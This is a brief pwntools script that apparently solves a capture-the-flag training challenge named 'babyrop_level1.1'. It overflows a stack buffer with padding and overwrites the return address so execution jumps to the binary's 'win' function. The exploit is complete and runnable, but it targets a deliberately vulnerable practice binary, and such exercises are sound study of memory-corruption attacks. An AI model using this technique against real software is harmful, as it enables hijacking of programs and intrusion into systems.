from pwn import *
# Init
elf = ELF("/challenge/babyrop_level1.1")
context.arch = "amd64"
context.endian = "little"


# Vars
buffer_length = 140 + 4 + 8 # local_98 and variable int 4 byte (local_c) + EBP
ret_address_win_function = p64(elf.symbols.win)
io = elf.process()

# Payload
payload = b"A"*buffer_length + ret_address_win_function 

# Action
io.sendline(payload)
io.interactive()